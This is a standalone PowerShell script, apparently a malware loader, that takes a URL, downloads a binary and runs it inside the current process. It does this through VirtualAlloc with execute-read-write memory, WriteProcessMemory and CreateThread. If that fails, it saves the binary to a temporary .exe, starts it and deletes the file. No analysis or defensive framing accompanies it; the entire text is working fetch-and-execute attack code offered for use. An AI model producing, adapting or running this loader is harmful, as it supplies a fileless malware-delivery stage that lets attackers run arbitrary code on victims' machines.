param ( [string]$Payload )

# Function to download and execute a binary in memory
function Execute-NativeBinaryInMemory {
    param ( [string]$Url )
    try {
        Write-Output "Attempting to download binary from $Url"
        # Download the binary into memory as a byte array
        $webClient = New-Object System.Net.WebClient
        $binaryData = $webClient.DownloadData($Url)
        Write-Output "Downloaded $($binaryData.Length) bytes from $Url"

        # Check if binary size is reasonable to avoid memory issues
        if ($binaryData.Length -gt 10MB) {
            Write-Warning "Binary size exceeds 10MB. Falling back to disk-based execution to avoid memory issues."
            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
        }

        # Use Windows API to allocate memory and execute the binary
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class NativeExecution {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr GetCurrentProcess();
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint GetCurrentProcessId();
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool CloseHandle(IntPtr hObject);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
        }
"@

        # Allocate memory for the binary
        $memSize = $binaryData.Length
        Write-Output "Allocating $memSize bytes in memory"
        $memPtr = [NativeExecution]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        if ($memPtr -eq [IntPtr]::Zero) {
            Write-Error "Failed to allocate memory for binary. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            Write-Output "Falling back to disk-based execution."
            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
        }
        Write-Output "Memory allocated at address: $memPtr"

        # Get the current process ID and open a handle with full access
        $processId = [NativeExecution]::GetCurrentProcessId()
        Write-Output "Current process ID: $processId"
        $PROCESS_ALL_ACCESS = 0x1F0FFF
        $processHandle = [NativeExecution]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
        if ($processHandle -eq [IntPtr]::Zero) {
            Write-Error "Failed to open current process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            Write-Output "Falling back to GetCurrentProcess()"
            $processHandle = [NativeExecution]::GetCurrentProcess()
            if ($processHandle -eq [IntPtr]::Zero) {
                Write-Error "Fallback failed. Unable to get process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                Write-Output "Falling back to disk-based execution."
                if ($memPtr -ne [IntPtr]::Zero) {
                    [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
                }
                return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
            }
        }
        Write-Output "Current process handle obtained: $processHandle"

        # Write the binary to the allocated memory in chunks to avoid crashes
        $bytesWritten = 0
        $chunkSize = 1024 * 1024 # 1MB chunks
        $offset = 0
        Write-Output "Writing $memSize bytes to memory at $memPtr in chunks of $chunkSize bytes"
        while ($offset -lt $memSize) {
            $remaining = [Math]::Min($chunkSize, $memSize - $offset)
            $chunk = New-Object byte[] $remaining
            [Array]::Copy($binaryData, $offset, $chunk, 0, $remaining)
            $tempBytesWritten = 0
            $success = [NativeExecution]::WriteProcessMemory($processHandle, [IntPtr]::Add($memPtr, $offset), $chunk, $remaining, [ref]$tempBytesWritten)
            if (-not $success) {
                Write-Error "Failed to write chunk at offset $offset to memory. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
                Write-Output "Falling back to disk-based execution."
                if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
                    [NativeExecution]::CloseHandle($processHandle)
                }
                if ($memPtr -ne [IntPtr]::Zero) {
                    [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
                }
                return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
            }
            $bytesWritten += $tempBytesWritten
            $offset += $remaining
        }
        Write-Output "Wrote $bytesWritten bytes to memory"

        # Create a thread to execute the binary in memory
        $threadId = 0
        $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-Error "Failed to create thread for execution. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            Write-Output "Falling back to disk-based execution."
            if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
                [NativeExecution]::CloseHandle($processHandle)
            }
            if ($memPtr -ne [IntPtr]::Zero) {
                [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
            }
            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
        }
        Write-Output "Thread created with ID: $threadId"

        # Wait for the thread to complete with a timeout to prevent hanging
        $timeout = 30000 # 30 seconds
        $result = [NativeExecution]::WaitForSingleObject($threadHandle, $timeout)
        if ($result -eq 0x00000102) { # WAIT_TIMEOUT
            Write-Warning "Thread execution timed out after $timeout ms. Continuing anyway."
        }
        Write-Output "Executed native binary from $Url in memory."

        # Clean up resources
        if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
            [NativeExecution]::CloseHandle($processHandle)
        }
        if ($threadHandle -ne [IntPtr]::Zero) {
            [NativeExecution]::CloseHandle($threadHandle)
        }
        if ($memPtr -ne [IntPtr]::Zero) {
            [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
        }
    }
    catch {
        Write-Error "Error executing native binary in memory: $_"
        Write-Output "Falling back to disk-based execution due to error."
        if ($memPtr -ne [IntPtr]::Zero) {
            [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
        }
        if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
            [NativeExecution]::CloseHandle($processHandle)
        }
        return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
    }
}

# Fallback function to save binary to disk and execute it
function Execute-BinaryOnDisk {
    param ( [string]$Url, [byte[]]$BinaryData )
    try {
        Write-Output "Executing binary on disk as fallback."
        $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
        Write-Output "Saving binary to temporary file: $tempPath"
        [System.IO.File]::WriteAllBytes($tempPath, $BinaryData)
        Write-Output "Starting process from disk."
        $process = Start-Process -FilePath $tempPath -NoNewWindow -PassThru
        Write-Output "Process started with ID: $($process.Id)"
        return $true
    }
    catch {
        Write-Error "Error executing binary on disk: $_"
        return $false
    }
    finally {
        if (Test-Path $tempPath) {
            Write-Output "Cleaning up temporary file: $tempPath"
            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
        }
    }
}

# Main logic to handle the payload
function Exec {
    param ( [string]$Payload )
    Write-Output "Processing payload: $Payload"
    # Check if the payload is a URL (for downloading a binary)
    if ($Payload -match "^https?://") {
        # Attempt to execute as a native binary in memory
        Execute-NativeBinaryInMemory -Url $Payload
    }
    else {
        Write-Error "Unsupported payload type. Provide a URL to a binary for in-memory execution."
    }
}

# Check if running with elevated privileges
$isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning "Script is not running with elevated privileges. Memory operations may fail. Consider running as Administrator."
}

# Execute the payload passed as an argument
Exec -Payload $Payload
